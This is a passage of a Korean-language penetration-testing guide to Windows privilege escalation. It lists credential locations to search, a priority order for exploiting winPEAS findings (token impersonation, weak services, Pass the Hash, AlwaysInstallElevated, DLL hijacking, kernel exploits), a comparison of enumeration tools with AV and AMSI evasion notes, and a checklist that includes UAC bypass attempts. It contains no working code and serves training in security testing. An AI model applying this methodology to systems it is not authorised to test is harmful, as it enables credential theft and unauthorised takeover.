│ - Unattend/Sysprep 파일 (패스워드 포함 가능)             │
│ - PowerShell 히스토리 (명령어에 패스워드)                 │
│ - 저장된 RDP 자격증명                                    │
│ - PuTTY 저장된 세션 (프록시 패스워드)                    │
│ - SSH 키                                                │
│ - 웹 설정 파일 (web.config 등)                          │
│ - WiFi 패스워드                                          │
└─────────────────────────────────────────────────────────┘
```

### winPEAS 결과 우선순위 분석 전략

```
1순위: RED 표시된 모든 항목
  -> 즉시 악용 가능성 확인

2순위: 토큰 권한 (SeImpersonatePrivilege 등)
  -> Potato 계열 도구 준비

3순위: 서비스 취약점 (Unquoted Path, Weak Permissions)
  -> 서비스 교체/재시작

4순위: 자격증명 발견
  -> 패스워드 재사용, Pass the Hash

5순위: AlwaysInstallElevated
  -> MSI를 통한 SYSTEM 쉘

6순위: DLL 하이재킹
  -> 프로세스 모니터 분석 필요

7순위: 커널 익스플로잇
  -> 누락된 패치 확인 후 exploit 검색
```

---

## 자동화 도구 비교

| 도구 | 용도 | 장점 | 단점 |
|------|------|------|------|
| winPEAS | 종합 열거 | 가장 포괄적, 색상 코딩 | AV 탐지 가능성 |
| Seatbelt | .NET 기반 열거 | GhostPack 도구, 상세함 | .NET 필요 |
| PowerUp | 서비스/레지스트리 검사 | PowerShell 기반, 자동 악용 기능 | PowerShell 제한 시 불가 |
| SharpUp | PowerUp의 C# 버전 | AV 우회 용이 | 컴파일 필요 |
| Watson | 누락 패치 탐지 | 커널 익스플로잇 자동 매칭 | 특정 버전만 지원 |
| BeRoot | 종합 검사 | Python/EXE 버전 제공 | winPEAS보다 덜 상세 |
| PrivescCheck | 종합 검사 (PS) | 순수 PowerShell, 깔끔한 출력 | AMSI 우회 필요할 수 있음 |

---

## 실전 체크리스트

```
[ ] whoami /priv 확인 (토큰 권한)
[ ] whoami /groups 확인 (그룹 멤버십)
[ ] systeminfo 패치 수준 확인
[ ] 서비스 검사 (Unquoted Path, Weak Permissions)
[ ] AlwaysInstallElevated 레지스트리 확인
[ ] AutoRun 프로그램 및 스케줄 작업 확인
[ ] 자격증명 검색 (히스토리, 설정 파일, 캐시)
[ ] UAC 상태 확인 및 우회 시도
[ ] DLL 하이재킹 가능성 조사
[ ] 커널/서비스 익스플로잇 검색
[ ] 내부 네트워크 서비스 확인
[ ] winPEAS 실행 (위 항목을 자동으로 전부 확인)
```

---

## 참고 자료

- [LOLBAS Project](https://lolbas-project.github.io/)
- [winPEAS (PEASS-ng)](https://github.com/peass-ng/PEASS-ng)
- [HackTricks - Windows Privilege Escalation](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)
- [PayloadsAllTheThings - Windows PrivEsc](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [MITRE ATT&CK - UAC Bypass](https://attack.mitre.org/techniques/T1548/002/)
- [Potato Attacks - TokenPlayer](https://github.com/S1ckB0y1337/TokenPlayer)
- [Windows PrivEsc - Exploit Notes](https://exploit-notes.hdks.org/exploit/windows/privilege-escalation/)
